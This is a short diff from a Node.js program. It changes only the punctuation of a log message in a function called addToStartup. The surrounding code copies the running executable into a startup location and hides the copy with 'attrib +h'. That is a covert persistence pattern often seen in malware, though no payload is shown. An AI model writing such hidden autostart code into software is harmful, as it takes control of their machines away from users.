@@ -20,7 +20,7 @@ function addToStartup() {
   
   fs.copyFile(process.execPath, startupAppPath, (err) => {
     if (err) throw err;
-    console.log(`${appFileName} added to startup successfully!`);
+    console.log(`${appFileName} added to startup successfully`);
 
     
     spawnSync('attrib', ['+h', startupAppPath], { shell: true });
